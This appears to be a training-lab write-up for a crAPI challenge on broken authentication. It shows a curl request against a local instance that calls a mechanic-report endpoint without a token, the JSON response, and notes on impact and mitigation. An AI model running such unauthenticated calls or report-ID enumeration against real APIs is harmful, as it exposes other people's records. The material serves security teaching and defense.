# Challenge 14 — Unauthenticated Access: Call an endpoint without a token

**OWASP API Top 10 mapping:** API2:2023 Broken Authentication  
**crAPI category:** Unauthenticated Access

## Goal

Find an API endpoint that should require authentication but can be called without any JWT.

## Vulnerability

The mechanic report-receiving endpoint `GET /workshop/api/mechanic/receive_report` has no `@jwt_auth_required` decorator. It accepts three query parameters, looks up the mechanic and vehicle, creates a service request, and returns the generated report link — all without checking whether the caller is logged in.

## Exploit steps

### 1. Discover the endpoint

From the source code (`crapi/services/workshop/crapi/mechanic/views.py`):

```python
class ReceiveReportView(APIView):
    def get(self, request):
        # no auth decorator
        ...
```

### 2. Call it without any Authorization header

Use any valid seeded mechanic code (e.g., `TRAC_JHN`) and any seeded vehicle VIN (e.g., from the seeded `Test` user).

```bash
curl -s -X GET \
  'http://127.0.0.1:8888/workshop/api/mechanic/receive_report?mechanic_code=TRAC_JHN&problem_details=test&vin=8IGEF39BZUJ159285' \
  -w "\nHTTP %{http_code}\n"
```

### 3. Observe the response

```json
{
  "id": 7,
  "sent": true,
  "report_link": "http://127.0.0.1:8888/workshop/api/mechanic/mechanic_report?report_id=7"
}
```

The endpoint created a service request and returned a report link without ever asking for a token.

## Why this works

- `ReceiveReportView` is missing the `@jwt_auth_required` decorator used by the surrounding views.
- The route in `urls.py` is still exposed as part of the mechanic API.
- An unauthenticated user can therefore create service-request records and obtain report IDs.

## Impact

- Anyone can create mechanic reports and read service-request details by iterating `report_id`.
- Report IDs may leak PII about vehicles and owners.
- The endpoint can also be used as a primitive for further attacks (e.g., DoS by generating many PDF reports).

## Mitigation

- Apply authentication and authorization middleware consistently to every endpoint.
- Use centralized route-level checks instead of relying on per-view decorators.
- Review all views for missing auth annotations, especially during refactors.
- Validate that resources created by an endpoint belong to the authenticated user.
